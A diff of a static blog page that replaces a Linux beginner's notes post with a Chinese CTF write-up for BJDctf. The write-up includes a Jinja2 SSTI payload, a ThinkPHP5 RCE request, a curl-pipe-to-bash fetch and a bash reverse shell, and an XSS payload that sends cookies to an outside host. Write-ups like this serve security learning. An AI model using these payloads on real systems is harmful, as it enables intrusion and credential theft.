@@ -8,7 +8,7 @@
   <meta name="description" content>
   <meta name="author" content="disshu">
   <!-- Open Graph Data -->
-  <meta property="og:title" content="linux学习笔记">
+  <meta property="og:title" content="BJDctf">
   <meta property="og:description" content>
   <meta property="og:site_name" content="disshu">
   <meta property="og:type" content="article">
@@ -43,7 +43,7 @@
     <div class="row">
       <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
         <div class="page-title with-background-image">
-          <p class="title">linux学习笔记</p>
+          <p class="title">BJDctf</p>
           <p class="subtitle"></p>
         </div>
         <div class="site-menu with-background-image">
@@ -99,8 +99,8 @@
           
           <!-- Date -->
           <span class="date-time info">On
-            <span class="date">2020-02-17</span>
-            <span class="time">09:50:05</span>
+            <span class="date">2020-03-24</span>
+            <span class="time">09:50:06</span>
           </span>
           
         </div>
@@ -108,20 +108,34 @@
         
         <!-- Post Main Content -->
         <div class="post-content">
-          <p>linux今天开课,fighting!</p>
-<a id="more"></a>
-<p>查看linux内核版本号</p>
-<pre><code class="hljs undefined">uname -<span class="hljs-built_in">r</span>
-<span class="hljs-keyword">cat</span> /proc/<span class="hljs-keyword">version</span></code></pre>
+          <!-- 跳出舒适圈 -->
+<p>crunck 生成字典 dirsearch -s 0.5防止429</p>
+<h1 id="fake-google"><a href="#fake-google" class="headerlink" title="fake google"></a>fake google</h1><p>ssti漏洞 试了挺过payload都不行</p>
+<pre><code class="hljs undefined">
 
-<p>查看distribution</p>
-<pre><code class="hljs undefined">cat /etc/centos-<span class="hljs-built_in">release</span>
-cat /etc/redhat-<span class="hljs-built_in">release</span></code></pre>
+<span class="django"><span class="xml"></span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">for</span></span> c <span class="hljs-keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><span class="xml"></span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">if</span></span> c.__name__=='catch_warnings' %&#125;</span><span class="xml"></span><span class="hljs-template-variable">&#123;&#123; c.__init__.__globals__['__builtins__'].open('/flag', 'r').read() &#125;&#125;</span><span class="xml"></span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endif</span></span> %&#125;</span><span class="xml"></span><span class="hljs-template-tag">&#123;% <span class="hljs-name"><span class="hljs-name">endfor</span></span> %&#125;</span><span class="xml"></span></span></code></pre>
 
-<p>硬件设备文件名在/dev<br>SATA,USB硬盘 /dev/sd[a-p]<br>ex:/dev/sda1 a:第一块硬盘 1:第一个分区<br>假设你的PC上有两个SATA磁盘和一个USB磁盘,上面有6个插槽,该怎么命名?<br>注:命名只与安装顺序有关,与插哪个口无关,第一个就/etc/sda<br>USB磁盘开机完成后才被系统识别,所以只能是最后一个<br>每一个硬盘最多只有4个分区<br><code>df</code>查看磁盘剩余空间的命令<br><code>df -h</code>查看硬盘使用情况<br><code>df -h -T</code>并查看类型<br>关机重启<br>shutdown是最常用也是最安全的关机和重启命令，它会在关机之前调用fsck检查磁盘，其中-h和-r是最常用的参数：<br>-h：停止系统服务并关机<br>-r： 停止系统服务后重启<br>举个例子：<br>shutdown -h now  –立即关机<br>shutdown -h 10:53  –到10:53关机，如果该时间小于当前时间，则到隔天<br>shutdown -h +10  –10分钟后自动关机<br>shutdown -r now  –立即重启<br>shutdown -r +30 ‘The System Will Reboot in 30 Mins’   –30分钟后重启并并发送通知给其它在线用户</p>
-<h1 id="linux命令"><a href="#linux命令" class="headerlink" title="linux命令"></a>linux命令</h1><p>～用户当前所在的目录<br>ls -a显示隐藏目录 -l列举详细信息 -ld列出当前目录<br>ls -l<br>第一位表示文件类型 d目录文件 l软连接文件 -普通文件<br>2-4位文件所有者权限 5-7位表示同组用户的权限 8-10位表示其他用户的权限<br>r读 w写 x执行 -无权限<br><strong>文件处理命令</strong><br>cd - 进入上次目录<br>mkdir -p xxx 同时建立目录名的上层目录<br>rmdir xxx 注意只能删除空目录 -p 顺带删除父目录<br>rm -r 删除目录及其下的文件和子目录<br>rm -f 强制删除<br>rm -i 一一确认再删除<br>rm -rf /后果严重 删除根目录下的所有文件<br>ln 生成链接文件 默认建立硬链接<br>-s 软链接<br><strong>文件搜索命令</strong><br>locate 文件名<br>locate –database=数据库 指定搜索数据库<br>whereis 搜索命令及其帮助文档<br>find / -name **** 在/ 目录搜索 可以用通配符搜索匹配<br>？匹配一个字符<br>[] 匹配指定的字符    </p>
-<hr>
-<p>who -u 查已登陆到系统的用户进程</p>
+<p>或者tplmap 然后curl到vps上</p>
+<pre><code class="hljs undefined">girl_friend=curl <span class="hljs-string">http:</span><span class="hljs-comment">//vps/shell.txt|bash</span>
+bash -i &gt;&amp; <span class="hljs-regexp">/dev/</span>tcp<span class="hljs-regexp">/[ip]/</span>[port] <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span></code></pre>
+
+<h1 id="old-hacker"><a href="#old-hacker" class="headerlink" title="old hacker"></a>old hacker</h1><p>thinkphp5漏洞</p>
+<pre><code class="hljs /index.php?s">先查看版本 然后找对应的rce</code></pre>
+
+<p><a href="http://47.93.234.29:2333/index.php?s=captcha" target="_blank" rel="noopener">http://47.93.234.29:2333/index.php?s=captcha</a></p>
+<p>_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=cat /flag</p>
+<pre><code class="hljs undefined"><span class="hljs-meta"># xss之光</span>
+思路 如果反序列化中没有任何类，那么我们只能用原生类
+因为有<span class="hljs-built_in">echo</span>，最好是对有<span class="hljs-variable">__toString</span>()方法的类进行反序列化，在<span class="hljs-variable">__toString</span>()原生类反序列化中，常用的是Error和Exception类，但是Error是php7专有，用查看看了下发现题目环境是php5：
+<span class="hljs-built_in">hint</span>给了xss</code></pre>
+
+<p>hu = new Exception(‘“<script>window.open(&#39;<a href="http://gem-love.com:12358/?\&#39;+document.cookie">http://gem-love.com:12358/?\&#39;+document.cookie</a>);</script>‘);<br>echo urlencode(serialize(hu));</p>
+<pre><code class="hljs undefined"># <span class="hljs-selector-tag">duangshell</span>
+这个就是<span class="hljs-selector-tag">swp</span>源码泄漏 是<span class="hljs-selector-class">.index</span><span class="hljs-selector-class">.php</span><span class="hljs-selector-class">.swp</span> 前面的.别忘了
+<span class="hljs-selector-tag">vim</span> <span class="hljs-selector-tag">-r</span> <span class="hljs-selector-tag">index</span><span class="hljs-selector-class">.php</span>恢复源码
+源码没有过滤<span class="hljs-selector-tag">curl</span></code></pre>
+
+<p>girl_friend=curl <a href="http://xxxx/shell.txt|bash" target="_blank" rel="noopener">http://xxxx/shell.txt|bash</a><br>shell.txt内容bash -i &gt;&amp; /dev/tcp/[ip]/[port] 0&gt;&amp;1<br>```</p>
 
         </div>
       </div>
